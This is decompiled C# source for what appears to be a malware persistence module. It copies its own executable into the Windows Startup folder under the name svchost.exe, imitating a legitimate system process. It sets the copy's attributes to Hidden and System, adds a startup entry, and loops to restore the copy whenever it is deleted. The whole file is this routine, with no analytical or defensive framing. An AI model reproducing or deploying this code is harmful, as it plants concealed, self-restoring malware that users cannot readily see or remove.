using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace svchost;

[StandardModule]
internal sealed class StartEvrey
{
	public static void StartWork()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_009a;
				case 258:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 4:
						case 5:
							goto IL_000e;
						case 6:
							goto IL_0016;
						case 7:
							goto IL_0022;
						case 8:
							goto IL_0048;
						case 10:
							goto IL_0061;
						case 11:
							goto IL_0064;
						case 12:
							goto IL_0081;
						case 2:
						case 9:
						case 13:
						case 14:
							goto IL_009a;
						default:
							goto end_IL_0001;
						case 3:
						case 15:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_0081:
					num = 12;
					File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\svchost.exe", FileAttributes.Hidden | FileAttributes.System);
					goto IL_009a;
					IL_0064:
					num = 11;
					File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\svchost.exe");
					goto IL_0081;
					IL_009a:
					num = 2;
					if (A.st != 0)
					{
						goto end_IL_0001_2;
					}
					goto IL_000e;
					IL_000e:
					num = 5;
					text = "Microsoft\\";
					goto IL_0016;
					IL_0016:
					num = 6;
					Thread.Sleep(2000);
					goto IL_0022;
					IL_0022:
					num = 7;
					Exta.AStartup(A.startUP, Interaction.Environ(A.PathS) + "\\" + text + "svchost.exe");
					goto IL_0048;
					IL_0048:
					num = 8;
					if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\svchost.exe"))
					{
						goto IL_0061;
					}
					goto IL_009a;
					IL_0061:
					num = 10;
					goto IL_0064;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 258;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
